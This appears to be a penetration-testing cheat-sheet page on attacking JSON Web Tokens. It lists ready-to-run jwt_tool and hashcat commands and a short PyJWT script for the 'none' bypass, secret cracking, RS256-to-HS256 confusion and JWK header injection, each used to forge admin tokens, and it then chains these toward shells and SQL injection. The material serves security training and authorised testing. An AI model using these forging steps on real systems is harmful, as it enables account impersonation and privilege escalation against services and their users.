---
id: jwt-attack
title: JWT Attacks
stage: initial-access
tags: [web]
summary: Forge or manipulate JSON Web Tokens to escalate privileges or impersonate other users — algorithm confusion and weak secrets are the two most common paths.
leads_to:
  - file-upload-shell
  - sqli-rce
  - web-enum
---

## Prerequisites

A web application that uses JWT for session management — look for `Authorization: Bearer eyJ...` headers or `token=eyJ...` cookies. The `eyJ` prefix is always base64-encoded `{"` (the start of a JSON object). Decode with Burp's Inspector or jwt.io.

JWTs have three base64url-encoded parts: header.payload.signature. Attacks target the signature verification: a `none` algorithm bypass removes signature checking entirely; algorithm confusion (RS256→HS256) uses the public key as an HMAC secret; weak secrets can be brute-forced. Once you forge a valid token you become whatever `role`, `sub`, or `admin` field you set.

## Quick Win

> Decode the token and check the algorithm — `none` and `HS256` are the most exploitable.

```bash
# Decode without verification
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..." | cut -d. -f1,2 | base64 -d 2>/dev/null
# Or use jwt_tool
python3 jwt_tool.py TOKEN
```

## Algorithm: none Bypass

> Change alg to none and strip the signature — works on old/misconfigured libraries.

```bash
python3 jwt_tool.py TOKEN -X a
# Manually: change "alg":"HS256" to "alg":"none", strip signature, keep trailing dot
```

## Weak Secret Brute Force

> Crack the HMAC secret with hashcat or jwt_tool — service accounts often use guessable secrets.

```bash
# hashcat
hashcat -a 0 -m 16500 'eyJ...' /usr/share/wordlists/rockyou.txt

# jwt_tool wordlist
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

## Algorithm Confusion (RS256 → HS256)

> If the public key is accessible, use it as the HMAC secret for HS256 — the server verifies with it thinking it's still HMAC.

```bash
# Fetch public key
curl http://TARGET/.well-known/jwks.json
curl http://TARGET/api/public-key

# Forge with jwt_tool
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

# Or with PyJWT
python3 - <<'EOF'
import jwt
public_key = open('public.pem').read()
payload = {"sub": "admin", "role": "admin"}
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
EOF
```

## Modify Claims

> Change role, sub, or admin fields after cracking/forging.

```bash
# jwt_tool — tamper specific claim
python3 jwt_tool.py TOKEN -T
# Follow interactive prompts to change claim values
```

## JWK Header Injection

> Embed your own public key in the token header — vulnerable servers trust it.

```bash
python3 jwt_tool.py TOKEN -X s
```

## Leads To

Admin token forged → access to admin panel → file upload, SQLi, command injection surfaces that weren't visible to the low-priv user. Admin panel with user management → create new admin users. File manager in admin panel → file-upload-shell. Admin SQLi surface → sqli-rce.
